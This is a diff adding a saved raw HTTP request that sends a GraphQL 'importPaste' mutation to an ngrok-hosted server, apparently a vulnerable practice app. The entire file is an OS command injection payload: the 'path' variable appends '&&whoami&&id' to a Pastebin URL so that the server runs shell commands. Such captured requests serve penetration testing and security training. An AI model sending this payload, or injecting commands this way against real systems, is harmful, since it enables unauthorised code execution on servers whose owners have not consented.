@@ -1,0 +1,18 @@
+POST /graphql HTTP/2
+Host: merlin-declivitous-crowdedly.ngrok-free.dev
+Cookie: abuse_interstitial=merlin-declivitous-crowdedly.ngrok-free.dev; chat_session_id=ac1813ce-74a0-4f9f-a7b5-e4b9caafeb6a; env=graphiql:disable
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://merlin-declivitous-crowdedly.ngrok-free.dev/import_paste
+Content-Type: application/json
+Content-Length: 315
+Origin: https://merlin-declivitous-crowdedly.ngrok-free.dev
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+{"query":"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\n        importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\n          result\n        }\n      }","variables":{"host":"pastebin.com","port":443,"path":"\/raw/m6GHCKJ2&&whoami&&id","scheme":"https"}}
